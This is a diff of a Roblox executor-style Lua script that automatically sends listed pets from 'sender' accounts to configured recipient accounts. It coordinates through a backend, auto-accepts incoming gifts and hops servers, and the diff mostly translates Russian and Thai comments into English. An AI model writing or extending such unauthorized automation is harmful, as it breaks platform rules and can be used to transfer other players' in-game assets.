     if not getgenv().Config.UseBackend then
         return
     end
     
-    -- Проверяем доступность бекенда
-    if not IsBackendAvailable() then
-        AddMessage("Бекенд недоступен, пропуск регистрации", "warning")
-        return false
-    end
-    
-    -- Проверяем, являемся ли мы получателем
+    -- Check if we are a receiver
     local isReceiver = false
     for _, username in pairs(getgenv().Config.Recipients) do
         if username == LocalPlayer.Name then
@@ -908,61 +1097,54 @@ local function RegisterAsReceiver()
         end
     end
     
-    -- Только получатели регистрируются и переходят с VIP/полных серверов
+    -- Only receivers register and react to VIP/full servers
     if isReceiver then
-        -- Проверяем, не находимся ли мы на VIP сервере
-        if IsVipServer() then
-            AddMessage("Получатель: VIP сервер, переход на обычный сервер перед регистрацией...", "warning")
-            RejoinNormalServer()
+        -- Check inventory overflow
+        if ShouldDisableReceiverDueToOverflow() then
+            AddMessage("Receiver: disabled due to inventory overflow, not registering", "warning")
             return false
         end
-        
-        -- Проверяем, не полный ли сервер
-        if IsServerFull() then
-            AddMessage("Получатель: сервер полный, переход на другой сервер перед регистрацией...", "warning")
+
+        -- If on VIP server → move to public before registration
+        if IsVipServer() then
+            AddMessage("Receiver: VIP server, moving to normal server before registration...", "warning")
             RejoinNormalServer()
             return false
         end
     else
-        -- Отправители не регистрируются как получатели
-        AddMessage("Отправитель: не регистрируемся как получатель", "info")
+        -- Senders don't register as receivers
+        AddMessage("Sender: not registering as receiver", "info")
         return false
     end
     
     local username = LocalPlayer.Name
     local jobId = "job-" .. username .. "-" .. tostring(tick())
     local serverId = game.JobId
-    local petsCount = CountPetsInInventory()
-    local maxPets = getgenv().Config.MaxPetsPerAccount
     
     local data = {
         receiver = username,
         jobId = jobId,
-        serverId = serverId,
-        petsCount = petsCount,
-        maxPets = maxPets
+        serverId = serverId
     }
     
     local url = getgenv().Config.BackendURL .. "/api/register-job"
     local response = MakeHttpRequest(url, "POST", data)
     
     if response and response.success then
-        AddMessage("Зарегистрирован как получатель в бекенде", "success")
+        AddMessage("Registered as receiver in backend", "success")
         AddMessage("Job ID: " .. jobId, "info")
         AddMessage("Server ID: " .. serverId, "info")
-        AddMessage("Питомцев в инвентаре: " .. petsCount .. "/" .. maxPets, "info")
-        AddMessage("Статус: " .. response.status, "info")
         
-        -- Сохраняем jobId для последующего удаления
+        -- Save jobId for later deletion
         getgenv().CurrentJobId = jobId
         return true
     else
-        AddMessage("Ошибка регистрации в бекенде", "error")
+        AddMessage("Backend registration error", "error")
         return false
     end
 end
 
--- Функция для удаления регистрации получателя
+-- Function to unregister receiver
 local function UnregisterAsReceiver()
     if not getgenv().Config.UseBackend or not getgenv().CurrentJobId then
         return
@@ -972,22 +1154,22 @@ local function UnregisterAsReceiver()
     local response = MakeHttpRequest(url, "DELETE")
     
     if response and response.success then
-        AddMessage("Удалена регистрация получателя", "success")
+        AddMessage("Receiver registration removed", "success")
         getgenv().CurrentJobId = nil
         return true
     else
-        AddMessage("Ошибка удаления регистрации", "error")
+        AddMessage("Error removing registration", "error")
         return false
     end
 end
 
--- Функция для обновления статуса получателя
+-- Function to update receiver status
 local function UpdateReceiverStatus()
     if not getgenv().Config.UseBackend then
         return
     end
     
-    -- Проверяем, являемся ли мы получателем
+    -- Check if we are a receiver
     local isReceiver = false
     for _, username in pairs(getgenv().Config.Recipients) do
         if username == LocalPlayer.Name then
@@ -996,73 +1178,59 @@ local function UpdateReceiverStatus()
         end
     end
     
-    -- Только получатели обновляют статус и переходят с VIP/полных серверов
+    -- Only receivers update status and react to VIP/full servers
     if isReceiver then
-        -- Проверяем, не находимся ли мы на VIP сервере
+        -- Check inventory overflow
+        if ShouldDisableReceiverDueToOverflow() then
+            AddMessage("Receiver: disabled due to inventory overflow, not updating status", "warning")
+            return false
+        end
+        
+        -- VIP: rejoin to public
         if IsVipServer() then
-            AddMessage("Получатель: VIP сервер, переход на обычный сервер...", "warning")
+            AddMessage("Receiver: VIP server, moving to normal server...", "warning")
             RejoinNormalServer()
             return false
         end
         
-        -- Проверяем, не полный ли сервер
+        -- Full: just wait on current server (no move)
         if IsServerFull() then
-            AddMessage("Получатель: сервер полный, переход на другой сервер...", "warning")
-            RejoinNormalServer()
+            AddMessage("Receiver: server is full, waiting on current server", "info")
             return false
         end
     else
-        -- Отправители не обновляют статус получателя
-        AddMessage("Отправитель: не обновляем статус получателя", "info")
+        -- Senders don't update receiver status
+        AddMessage("Sender: not updating receiver status", "info")
         return false
     end
     
     local username = LocalPlayer.Name
     local serverId = game.JobId
-    local petsCount = CountPetsInInventory()
-    local maxPets = getgenv().Config.MaxPetsPerAccount
     
     local data = {
         receiver = username,
-        serverId = serverId,
-        petsCount = petsCount,
-        maxPets = maxPets
+        serverId = serverId
     }
     
     local url = getgenv().Config.BackendURL .. "/api/update-receiver"
     local response = MakeHttpRequest(url, "POST", data)
     
     if response and response.success then
-        AddMessage("Статус получателя обновлен", "info")
-        AddMessage("Питомцев в инвентаре: " .. petsCount .. "/" .. maxPets, "info")
-        AddMessage("Статус: " .. response.status, "info")
+        AddMessage("Receiver status updated", "info")
         return true
     else
-        AddMessage("Ошибка обновления статуса", "error")
+        AddMessage("Error updating status", "error")
         return false
     end
 end
 
--- Основная функция авто трейда
+-- Main auto trade function
 local function AutoTrade()
     if not getgenv().Config.Enabled then
         return
     end
     
-    -- Проверяем подключение и персонажа
-    if not LocalPlayer or not LocalPlayer.Character then
-        AddMessage("Персонаж не загружен, ожидание...", "warning")
-        return
-    end
-    
-    -- Проверяем стабильность соединения
-    local connection = game:GetService("NetworkClient")
-    -- if not connection or not connection.Connection then
-    --     AddMessage("Проблемы с сетевым соединением, ожидание...", "error")
-    --     return
-    -- end
-    
-    -- Проверяем, являемся ли мы получателем
+    -- Check if we are a receiver
     local isReceiver = false
     for _, username in pairs(getgenv().Config.Recipients) do
         if username == LocalPlayer.Name then
@@ -1071,112 +1239,54 @@ local function AutoTrade()
         end
     end
     
-    -- Если мы получатель, не выполняем логику отправки
+    -- If we are receiver, don't execute sending logic
     if isReceiver then
-        AddMessage("Мы являемся получателем, ожидаем отправителя...", "info")
+        AddMessage("We are receiver, waiting for sender...", "info")
         return
     end
     
-    -- Проверяем, есть ли у нас питомцы для трейда
+    -- Check if we have pets for trading
     if not HasPetsForTrade() then
-        AddMessage("Нет питомцев для трейда в инвентаре, ожидание...", "warning")
+        AddMessage("No pets for trading in inventory, waiting...", "warning")
         return
     end
     
-    -- Проверяем доступных получателей через бекенд
-    local availableReceiver = nil
-    if getgenv().Config.UseBackend then
-        local usernames = table.concat(getgenv().Config.Recipients, ",")
-        local url = getgenv().Config.BackendURL .. "/api/check-receivers?usernames=" .. usernames
-        local response = MakeHttpRequest(url, "GET")
-        
-        if response and response.success and response.availableReceivers and #response.availableReceivers > 0 then
-            availableReceiver = response.availableReceivers[1]
-            AddMessage("Найден доступный получатель: " .. availableReceiver.username, "success")
-            AddMessage("Статус: " .. availableReceiver.status, "info")
-            AddMessage("Питомцев у получателя: " .. availableReceiver.petsCount .. "/" .. availableReceiver.maxPets, "info")
-        else
-            AddMessage("Нет доступных получателей для трейда", "warning")
+    -- 1) очередь/резервация через бэкенд
+    local reserved = RequestQueueReservation()
+    local targetPlayer = nil
+    if reserved then
+        -- выполняем телепорт на зарезервированного реципиента
+        if getgenv().Config.AutoTeleport and LocalPlayer.Name ~= reserved.username then
+            TeleportToReceiver(reserved)
             return
         end
     else
-        -- Старая логика для локального поиска
-        local targetPlayer = FindFirstAvailableRecipient()
-        if targetPlayer then
-            AddMessage("Найден получатель на текущем сервере: " .. targetPlayer.Name, "success")
+        -- 2) локальный поиск и обычная логика через /api/check-receivers
+        targetPlayer = FindFirstAvailableRecipient()
+    end
+    if targetPlayer then
+        AddMessage("Found receiver: " .. targetPlayer.Name, "success")
+    else
+        -- If no receiver on current server and autoteleport is enabled
+        if getgenv().Config.UseBackend and getgenv().Config.AutoTeleport then
+            AddMessage("No receiver found on current server, waiting for teleport...", "info")
+            return
         else
             local recipientList = table.concat(getgenv().Config.Recipients, ", ")
-            AddMessage("Ни один из получателей не найден на сервере: " .. recipientList, "error")
+            AddMessage("None of the recipients found on server: " .. recipientList, "error")
             return
         end
     end
     
-    -- Если используем бекенд и есть доступный получатель, присоединяемся к обычному серверу
-            -- ถ้าใช้เบคเอนด์และมีผู้รับ...
-    if getgenv().Config.UseBackend and availableReceiver then
-        
-        -- 1. เช็คก่อนว่าอยู่คนละเซิร์ฟเวอร์หรือไม่
-        if game.JobId ~= availableReceiver.serverId then
-            -- 2. ถ้าอยู่คนละเซิร์ฟ ค่อยสั่งวาร์ป
-            AddMessage("กำลังวาร์ปไปหา " .. availableReceiver.username .. " ที่เซิร์ฟอื่น...", "info")
-            if not TeleportToReceiver(availableReceiver) then
-                AddMessage("Ошибка присоединения к серверу", "error")
-                return -- ถ้าเทเลพอร์ตไม่สำเร็จ ให้หยุด
-            end
-
-            -- 3. รอให้เกมโหลดทันหลังจากวาร์ป
-            AddMessage("รอโหลดเซิร์ฟเวอร์และตัวละครหลังวาร์ป...", "info")
-            if not LocalPlayer.Character then
-                LocalPlayer.CharacterAdded:Wait() -- จะรอจนกว่าตัวละครของผู้ส่งจะเกิดในเซิร์ฟเวอร์ใหม่
-            end
-            task.wait(2) -- อาจจะรอเพิ่มอีกนิดหน่อยเผื่อกรณีฉุกเฉิน
-            AddMessage("ตัวละครโหลดเสร็จสิ้น! เริ่มค้นหาผู้รับ...", "success") -- เพิ่มการรอที่จำเป็น
-        else
-            -- 4. ถ้าอยู่เซิร์ฟเดียวกันแล้ว ก็แค่แจ้งสถานะ ไม่ต้องวาร์ป
-            AddMessage("อยู่เซิร์ฟเดียวกับเป้าหมายแล้ว เริ่มค้นหา...", "success")
-        end
-
-        -- 5. ส่วนของการค้นหาผู้เล่น (จะทำงานหลังจากวาร์ปเสร็จ หรือหลังจากพบว่าอยู่เซิร์ฟเดียวกันแล้ว)
-        -- โค้ดส่วนนี้คือโค้ดเดิมของคุณที่ใช้ while loop
-        AddMessage("เริ่มต้นการค้นหาผู้เล่นในเซิร์ฟเวอร์...", "info")
-        local startTime = tick()
-        local maxWaitTime = getgenv().Config.ServerSelectionTimeout
-        
-        while tick() - startTime < maxWaitTime do
-            task.wait(0.5)
-            
-            if not LocalPlayer or not LocalPlayer.Character then
-                AddMessage("Потеря соединения во время ожидания, завершение...", "error")
-                CompleteTrade(availableReceiver.username, false)
-                return
-            end
-            
-            local targetPlayer = FindPlayerByName(availableReceiver.username)
-            if targetPlayer then
-                AddMessage("Получатель найден на сервере: " .. targetPlayer.Name, "success")
-                break
-            end
-            
-            AddMessage("Поиск получателя на сервере...", "info")
-        end
-        
-        if not FindPlayerByName(availableReceiver.username) then
-            AddMessage("Получатель не найден на сервере, завершение...", "error")
-            CompleteTrade(availableReceiver.username, false)
-            return
-        end
-
-        -- ถ้าหาเจอ ก็จะไปทำส่วนของการเทรดต่อไป...
-    end    
-    
-    -- Получаем весь инвентарь
+    -- Get full inventory
     local fullInventory = GetFullInventory()
-    AddMessage("Найдено предметов в инвентаре: " .. #fullInventory, "info")
+    AddMessage("Found items in inventory: " .. #fullInventory, "info")
     
-    -- Ищем питомцев для трейда
+    -- Look for pets to trade
     local petsToTrade = {}
     local foundPets = {}
-    local usedUUIDs = {} -- Для отслеживания уникальных питомцев
+    local usedUUIDs = {} -- For tracking unique pets
+    local petToRecipients = BuildPetToRecipientsMap()
     
     for _, item in pairs(fullInventory) do
         if item:IsA("Tool") then
@@ -1186,126 +1296,86 @@ local function AutoTrade()
                 if petData then
                     table.insert(foundPets, petData)
                     local baseName = GetBasePetName(petData.Name)
-                    AddMessage("Найден питомец: " .. petData.Name .. " (основное имя: " .. baseName .. ")", "info")
+                    AddMessage("Found pet: " .. petData.Name .. " (base name: " .. baseName .. ")", "info")
                     
                     if IsPetInTradeList(petData.Name) then
-                        -- Проверяем, что этот питомец еще не добавлен (по UUID)
-                        if not usedUUIDs[petUUID] then
-                            table.insert(petsToTrade, petData)
-                            usedUUIDs[petUUID] = true
-                            AddMessage("Питомец добавлен в список трейда: " .. baseName, "success")
+                        -- Respect recipient mapping
+                        if targetPlayer and not IsPetAllowedForRecipient(petData.Name, targetPlayer.Name, petToRecipients) then
+                            AddMessage("Pet allowed for other recipients, skipping for " .. targetPlayer.Name .. ": " .. baseName, "info")
                         else
-                            AddMessage("Питомец уже в списке трейда (дубликат): " .. baseName, "warning")
+                        -- Check if this pet is not already added (by UUID)
+                            if not usedUUIDs[petUUID] then
+                                table.insert(petsToTrade, petData)
+                                usedUUIDs[petUUID] = true
+                                AddMessage("Pet added to trade list: " .. baseName, "success")
+                            else
+                                AddMessage("Pet already in trade list (duplicate): " .. baseName, "warning")
+                            end
                         end
                     else
-                        AddMessage("Питомец НЕ в списке трейда: " .. baseName, "warning")
+                        AddMessage("Pet NOT in trade list: " .. baseName, "warning")
                     end
                 end
             else
-                AddMessage("Предмет не является питомцем: " .. item.Name, "info")
+                AddMessage("Item is not a pet: " .. item.Name, "info")
             end
         end
     end
     
-    AddMessage("Всего найдено питомцев: " .. #foundPets, "info")
+    AddMessage("Total pets found: " .. #foundPets, "info")
     
     if #petsToTrade == 0 then
-        AddMessage("Нет питомцев для трейда в инвентаре", "warning")
+        AddMessage("No pets for trading in inventory", "warning")
         return
     end
     
-    AddMessage("Найдено питомцев для трейда: " .. #petsToTrade, "info")
+    AddMessage("Found pets for trading: " .. #petsToTrade, "info")
     
-    -- Показываем всех найденных питомцев для отладки
+    -- Show all found pets for debugging
     for i, petData in pairs(petsToTrade) do
-        AddMessage("Питомец " .. i .. ": " .. petData.Name, "info")
+        AddMessage("Pet " .. i .. ": " .. petData.Name, "info")
     end
     
     local sentCount = 0
-    local targetPlayer = nil
     
-    -- Находим получателя на текущем сервере
-    if availableReceiver then
-        targetPlayer = FindPlayerByName(availableReceiver.username)
-    else
-        targetPlayer = FindFirstAvailableRecipient()
-    end
-    
-    if not targetPlayer then
-        AddMessage("Получатель не найден на сервере, завершение трейда", "error")
-        if availableReceiver then
-            CompleteTrade(availableReceiver.username, false)
-        end
-        return
-    end
-    
-    -- Создаем копию массива для безопасного удаления элементов
+    -- Create a copy of array for safe element removal
     local petsToSend = {}
     for i, petData in pairs(petsToTrade) do
         petsToSend[i] = petData
     end
     
-    local startTradeTime = tick()
-    local maxTradeTime = getgenv().Config.TradeTimeout
-    
     for i = #petsToSend, 1, -1 do
-        -- Проверяем таймаут трейда
-        if tick() - startTradeTime > maxTradeTime then
-            AddMessage("Превышен таймаут трейда, завершение...", "warning")
-            break
-        end
-        
-        -- Проверяем подключение
-        if not LocalPlayer or not LocalPlayer.Character then
-            AddMessage("Потеря соединения во время трейда, завершение...", "error")
-            break
-        end
-        
-        -- Проверяем, что получатель все еще на сервере
-        if not FindPlayerByName(targetPlayer.Name) then
-            AddMessage("Получатель покинул сервер, завершение трейда...", "error")
-            break
-        end
-        
         local petData = petsToSend[i]
         
-        -- Проверяем, что питомец все еще существует
+        -- Check if pet still exists
         if petData and petData.Tool and petData.Tool.Parent then
-            -- Сначала берем питомца в руки
+            -- First equip the pet
             if EquipPet(petData) then
-                task.wait(1) -- Увеличиваем задержку для стабильности
+                task.wait(0.5) -- Small delay after equipping
                 
-                -- Затем отправляем
-                if SendPet(petData, targetPlayer) then
+                -- Then send
+                if SendPet(petData, targetPlayer or (reserved and FindPlayerByName(reserved.username))) then
                     sentCount = sentCount + 1
-                    task.wait(2) -- Увеличиваем задержку между отправками
+                    task.wait(1) -- Delay between sends
                     
-                    -- Удаляем питомца из списка после успешной отправки
+                    -- Remove pet from list after successful send
                     table.remove(petsToSend, i)
-                else
-                    AddMessage("Ошибка отправки питомца: " .. petData.Name, "error")
-                    task.wait(1) -- Задержка при ошибке
                 end
-            else
-                AddMessage("Ошибка взятия питомца в руки: " .. petData.Name, "error")
-                task.wait(1) -- Задержка при ошибке
             end
         else
-            -- Удаляем питомца из списка, если он больше не существует
+            -- Remove pet from list if it no longer exists
             table.remove(petsToSend, i)
-            AddMessage("Питомец больше не найден: " .. (petData and petData.Name or "неизвестный"), "warning")
         end
     end
     
     if sentCount > 0 then
-        AddMessage("Отправлено питомцев: " .. sentCount, "success")
-        
-        -- Завершаем трейд в бекенде
-        if availableReceiver then
-            CompleteTrade(availableReceiver.username, true)
+        AddMessage("Sent pets: " .. sentCount, "success")
+        -- освободить резервацию, если была
+        if reserved and reserved.username then
+            ReleaseQueueReservation(reserved.username)
         end
         
-        -- Проверяем, являемся ли мы отправителем
+        -- Check if we are sender
         local isReceiver = false
         for _, username in pairs(getgenv().Config.Recipients) do
             if username == LocalPlayer.Name then
@@ -1314,127 +1384,35 @@ local function AutoTrade()
             end
         end
         
-        -- Если мы отправитель и успешно отправили питомцев, выходим с сервера
+        -- If we are sender and successfully sent pets, leave server
         if not isReceiver and getgenv().Config.LeaveServerAfterTrade then
-            AddMessage("Отправитель: трейд завершен, выход с сервера через 3 секунды...", "info")
-            AddMessage("Причина: Success traded!", "success")
-            task.wait(3) -- Небольшая задержка перед выходом
+            AddMessage("Sender: trade completed, leaving server in 3 seconds...", "info")
+            task.wait(3) -- Small delay before leaving
             LeaveServerAfterTrade()
         elseif not isReceiver and not getgenv().Config.LeaveServerAfterTrade then
-            AddMessage("Отправитель: трейд завершен, остаемся на сервере (настройка отключена)", "info")
-        end
-    else
-        AddMessage("Не удалось отправить питомцев", "error")
-        if availableReceiver then
-            CompleteTrade(availableReceiver.username, false)
+            AddMessage("Sender: trade completed, staying on server (setting disabled)", "info")
         end
     end
 end
 
--- Обработчик входящих подарков
+-- Incoming gifts handler
 GiftPet.OnClientEvent:Connect(function(giftId, petName, senderName)
-    AddMessage("Получен подарок от: " .. senderName .. " Питомец: " .. petName, "success")
+    AddMessage("Received gift from: " .. senderName .. " Pet: " .. petName, "success")
     
-    -- Автоматически принимаем все подарки
+    -- Automatically accept all gifts
     AcceptGift(giftId)
 end)
 
--- Обработчик отключения от сервера
-game.Players.PlayerRemoving:Connect(function(player)
-    if player == LocalPlayer then
-        AddMessage("Отключение от сервера обнаружено", "warning")
-        HandleServerClosing()
-    end
-end)
-
--- Обработчик ошибок подключения
-local connection = game:GetService("NetworkClient")
-if connection then
-    connection.ConnectionFailed:Connect(function(error)
-        AddMessage("Ошибка подключения: " .. tostring(error), "error")
-        HandleServerClosing()
-    end)
-end
-
--- Основной цикл
+-- Main loop
 local function MainLoop()
     while getgenv().Config.Enabled do
-        task.wait(5) -- Проверяем каждые 5 секунд
+        task.wait(5) -- Check every 5 seconds
         
         local shouldContinue = false
         
-        -- Проверяем стабильность соединения
-        if not IsConnectionStable() then
-            AddMessage("Нестабильное соединение, ожидание...", "warning")
-            task.wait(10) -- Ждем дольше при проблемах с соединением
-            shouldContinue = true
-        end
-        
-        -- Периодически проверяем статус сервера
-        if getgenv().Config.UseBackend and not shouldContinue then
-            -- Проверяем доступность бекенда
-            if not IsBackendAvailable() then
-                AddMessage("Бекенд недоступен, работа в автономном режиме", "warning")
-                shouldContinue = true
-            else
-                -- Проверяем, являемся ли мы получателем
-                local isReceiver = false
-                for _, username in pairs(getgenv().Config.Recipients) do
-                    if username == LocalPlayer.Name then
-                        isReceiver = true
-                        break
-                    end
-                end
-                
-                    if isReceiver then
-        -- Получатели переходят с VIP и полных серверов
-        if IsVipServer() and getgenv().Config.AutoRejoinOnVipServer then
-            AddMessage("Получатель: VIP сервер в основном цикле, переход...", "warning")
-            -- Добавляем задержку перед переходом для стабильности
-            task.wait(5)
-            RejoinNormalServer()
-            task.wait(15) -- Увеличиваем время ожидания после перехода
-            shouldContinue = true
-        elseif IsServerFull() then
-            AddMessage("Получатель: сервер полный в основном цикле, переход...", "warning")
-            task.wait(5)
-            RejoinNormalServer()
-            task.wait(15) -- Увеличиваем время ожидания после перехода
-            shouldContinue = true
-        end
-    else
-        -- Отправители остаются на своих серверах
-        if IsVipServer() then
-            AddMessage("Отправитель: VIP сервер, остаемся на текущем сервере", "info")
-        elseif IsServerFull() then
-            AddMessage("Отправитель: сервер полный, остаемся на текущем сервере", "info")
-        end
-    end
-            end
-        end
-        
-        if not shouldContinue and LocalPlayer.Character then
-            AutoTrade()
-        end
-    end
-end
-
--- Цикл для получателя (регистрация и обновление статуса)
-local function ReceiverLoop()
-    -- Регистрируемся как получатель при запуске
-    if getgenv().Config.UseBackend then
-        task.wait(2) -- Небольшая задержка для загрузки
-        RegisterAsReceiver()
-    end
-    
-    while getgenv().Config.Enabled do
-        task.wait(30) -- Обновляем статус каждые 30 секунд
-        
-        local shouldContinue = false
-        
-        -- Проверяем статус сервера перед обновлением (только для получателей)
+        -- Periodically check server status
         if getgenv().Config.UseBackend then
-            -- Проверяем, являемся ли мы получателем
+            -- Check if we are a receiver
             local isReceiver = false
             for _, username in pairs(getgenv().Config.Recipients) do
                 if username == LocalPlayer.Name then
@@ -1444,17 +1422,76 @@ local function ReceiverLoop()
             end
             
             if isReceiver then
-                -- Только получатели проверяют и переходят
-                if IsVipServer() and getgenv().Config.AutoRejoinOnVipServer then
-                    AddMessage("Получатель: VIP сервер в цикле получателя, переход...", "warning")
+                -- Receivers move from VIP and full servers
+                if IsVipServer() then
+                    AddMessage("Receiver: VIP server in main loop, moving...", "warning")
                     RejoinNormalServer()
-                    task.wait(10) -- Ждем дольше после перехода
+                    task.wait(10) -- Wait longer after moving
                     shouldContinue = true
                 elseif IsServerFull() then
-                    AddMessage("Получатель: сервер полный в цикле получателя, переход...", "warning")
-                    RejoinNormalServer()
-                    task.wait(10) -- Ждем дольше после перехода
+                    AddMessage("Receiver: server is full in main loop, waiting on current server", "info")
                     shouldContinue = true
+                end
+            else
+                -- Senders stay on their servers
+                if IsVipServer() then
+                    AddMessage("Sender: VIP server, staying on current server", "info")
+                elseif IsServerFull() then
+                    AddMessage("Sender: server is full, staying on current server", "info")
+                end
+            end
+        end
+        
+        if not shouldContinue then
+            AutoTrade()
+        end
+    end
+end
+
+-- Receiver loop (registration and status updates)
+local function ReceiverLoop()
+    -- Register as receiver on startup
+    if getgenv().Config.UseBackend then
+        task.wait(2) -- Small delay for loading
+        RegisterAsReceiver()
+    end
+    
+    while getgenv().Config.Enabled do
+        task.wait(30) -- Update status every 30 seconds
+        
+        -- Сбросить флаг уведомления, если инвентарь нормализован
+        ResetInventoryNotificationIfNormalized()
+        
+        local shouldContinue = false
+        
+        -- Check server status before update (only for receivers)
+        if getgenv().Config.UseBackend then
+            -- Check if we are a receiver
+            local isReceiver = false
+            for _, username in pairs(getgenv().Config.Recipients) do
+                if username == LocalPlayer.Name then
+                    isReceiver = true
+                    break
+                end
+            end
+            
+            if isReceiver then
+                -- Check inventory overflow
+                if ShouldDisableReceiverDueToOverflow() then
+                    AddMessage("Receiver: disabled due to inventory overflow in receiver loop", "warning")
+                    task.wait(60) -- Wait longer when overflowed
+                    shouldContinue = true
+                else
+                    -- Only receivers check and move
+                    if IsVipServer() then
+                        AddMessage("Receiver: VIP server in receiver loop, moving...", "warning")
+                        RejoinNormalServer()
+                        task.wait(10)
+                        shouldContinue = true
+                    elseif IsServerFull() then
+                        AddMessage("Receiver: server is full in receiver loop, waiting on current server", "info")
+                        shouldContinue = true
+                    end
                 end
             end
         end
@@ -1465,136 +1502,131 @@ local function ReceiverLoop()
     end
 end
 
--- Запуск основного цикла
+-- Start main loop
 task.spawn(MainLoop)
 
--- Запуск цикла для получателя
+-- Start receiver loop
 task.spawn(ReceiverLoop)
 
--- Команды для управления
+-- Commands for management
 local function CreateCommands()
     local function ToggleAutoTrade()
         getgenv().Config.Enabled = not getgenv().Config.Enabled
-        AddMessage("Авто трейд: " .. (getgenv().Config.Enabled and "Включен" or "Выключен"), "info")
+        AddMessage("Auto trade: " .. (getgenv().Config.Enabled and "Enabled" or "Disabled"), "info")
     end
     
     local function SetTargetPlayer(username)
-        -- Очищаем список получателей и добавляем одного игрока
+        -- Clear recipients list and add one player
         getgenv().Config.Recipients = {username}
-        AddMessage("Целевой игрок установлен: " .. username, "info")
+        AddMessage("Target player set: " .. username, "info")
     end
     
     local function AddRecipient(username)
-        -- Проверяем, нет ли уже такого игрока в списке
+        -- Check if player is already in list
         for _, existingPlayer in pairs(getgenv().Config.Recipients) do
             if existingPlayer == username then
-                AddMessage("Игрок " .. username .. " уже в списке получателей", "warning")
+                AddMessage("Player " .. username .. " already in recipients list", "warning")
                 return
             end
         end
         
         table.insert(getgenv().Config.Recipients, username)
-        AddMessage("Получатель добавлен: " .. username, "success")
+        AddMessage("Recipient added: " .. username, "success")
     end
     
     local function RemoveRecipient(username)
         for i, player in pairs(getgenv().Config.Recipients) do
             if player == username then
                 table.remove(getgenv().Config.Recipients, i)
-                AddMessage("Получатель удален: " .. username, "warning")
+                AddMessage("Recipient removed: " .. username, "warning")
                 break
             end
         end
     end
     
     local function ShowRecipients()
-        AddMessage("=== Список получателей ===", "info")
+        AddMessage("=== Recipients List ===", "info")
         for i, player in pairs(getgenv().Config.Recipients) do
             AddMessage(i .. ". " .. player, "info")
         end
-        AddMessage("=========================", "info")
+        AddMessage("======================", "info")
     end
     
     local function AddPetToTradeList(petName)
         table.insert(getgenv().Config.PetsToTrade, petName)
-        AddMessage("Питомец добавлен в список трейда: " .. petName, "success")
+        AddMessage("Pet added to trade list: " .. petName, "success")
     end
     
     local function RemovePetFromTradeList(petName)
         for i, pet in pairs(getgenv().Config.PetsToTrade) do
             if pet == petName then
                 table.remove(getgenv().Config.PetsToTrade, i)
-                AddMessage("Питомец удален из списка трейда: " .. petName, "warning")
+                AddMessage("Pet removed from trade list: " .. petName, "warning")
                 break
             end
         end
     end
     
     local function ShowConfig()
-        AddMessage("=== Конфигурация авто трейда ===", "info")
-        AddMessage("Статус: " .. (getgenv().Config.Enabled and "Включен" or "Выключен"), "info")
-        AddMessage("Бекенд: " .. (getgenv().Config.UseBackend and "Включен" or "Выключен"), "info")
-        AddMessage("Автотелепорт: " .. (getgenv().Config.AutoTeleport and "Включен" or "Выключен"), "info")
-        AddMessage("Пропуск телепорта без питомцев: " .. (getgenv().Config.SkipTeleportIfNoPets and "Включен" or "Выключен"), "info")
-        AddMessage("Выход с сервера после трейда: " .. (getgenv().Config.LeaveServerAfterTrade and "Включен" or "Выключен"), "info")
-        AddMessage("URL бекенда: " .. getgenv().Config.BackendURL, "info")
-        AddMessage("Получатели:", "info")
+        AddMessage("=== Auto Trade Configuration ===", "info")
+        AddMessage("Status: " .. (getgenv().Config.Enabled and "Enabled" or "Disabled"), "info")
+        AddMessage("Backend: " .. (getgenv().Config.UseBackend and "Enabled" or "Disabled"), "info")
+        AddMessage("Auto Teleport: " .. (getgenv().Config.AutoTeleport and "Enabled" or "Disabled"), "info")
+        AddMessage("Skip teleport without pets: " .. (getgenv().Config.SkipTeleportIfNoPets and "Enabled" or "Disabled"), "info")
+        AddMessage("Leave server after trade: " .. (getgenv().Config.LeaveServerAfterTrade and "Enabled" or "Disabled"), "info")
+        AddMessage("Backend URL: " .. getgenv().Config.BackendURL, "info")
+        AddMessage("Recipients:", "info")
         for i, player in pairs(getgenv().Config.Recipients) do
             AddMessage(i .. ". " .. player, "info")
         end
-        AddMessage("Питомцы для трейда:", "info")
+        AddMessage("Pets for trading:", "info")
         for i, pet in pairs(getgenv().Config.PetsToTrade) do
             AddMessage(i .. ". " .. pet, "info")
         end
-        AddMessage("================================", "info")
+        AddMessage("=================================", "info")
     end
     
     local function ToggleBackend()
         getgenv().Config.UseBackend = not getgenv().Config.UseBackend
-        AddMessage("Бекенд: " .. (getgenv().Config.UseBackend and "Включен" or "Выключен"), "info")
-    end
-    
-    local function DisableBackendOnError()
-        if getgenv().Config.UseBackend then
-            AddMessage("Отключение бекенда из-за ошибок подключения", "warning")
-            getgenv().Config.UseBackend = false
-            AddMessage("Бекенд отключен, работа в автономном режиме", "info")
-        end
-    end
-    
-    local function ForceRejoinOnServerClose()
-        AddMessage("Принудительный переход на новый сервер...", "info")
-        HandleServerClosing()
+        AddMessage("Backend: " .. (getgenv().Config.UseBackend and "Enabled" or "Disabled"), "info")
     end
     
     local function ToggleAutoTeleport()
         getgenv().Config.AutoTeleport = not getgenv().Config.AutoTeleport
-        AddMessage("Автотелепорт: " .. (getgenv().Config.AutoTeleport and "Включен" or "Выключен"), "info")
+        AddMessage("Auto Teleport: " .. (getgenv().Config.AutoTeleport and "Enabled" or "Disabled"), "info")
+    end
+    
+    local function ToggleSmartServerSearch()
+        getgenv().Config.SmartServerSearch = not getgenv().Config.SmartServerSearch
+        AddMessage("Smart Server Search: " .. (getgenv().Config.SmartServerSearch and "Enabled" or "Disabled"), "info")
+    end
+    
+    local function PreviewBestServer()
+        local best = FindBestPublicServer(126884695634066)
+        if best then
+            AddMessage("Best server preview: id=" .. tostring(best.id) .. ", players=" .. tostring(best.playing) .. "/" .. tostring(best.maxPlayers), "success")
+        else
+            AddMessage("Best server preview: not found", "warning")
+        end
     end
     
     local function CheckBackendStatus()
         if not getgenv().Config.UseBackend then
-            AddMessage("Бекенд отключен", "warning")
+            AddMessage("Backend disabled", "warning")
             return
         end
         
         local url = getgenv().Config.BackendURL .. "/api/stats"
         local response = MakeHttpRequest(url, "GET")
         
-        if response and response.success and response.stats then -- เพิ่มการตรวจสอบ response.stats
-            AddMessage("=== Статус бекенда ===", "info")
-            AddMessage("Активных jobs: " .. tostring(response.stats.activeJobs), "info")
-            AddMessage("Активных получателей: " .. tostring(response.stats.activeReceivers), "info")
-            AddMessage("Время сервера: " .. tostring(response.stats.serverTime), "info")
-            AddMessage("=======================", "info")
+        if response and response.success then
+            AddMessage("=== Backend Status ===", "info")
+            AddMessage("Active jobs: " .. response.stats.activeJobs, "info")
+            AddMessage("Active receivers: " .. response.stats.activeReceivers, "info")
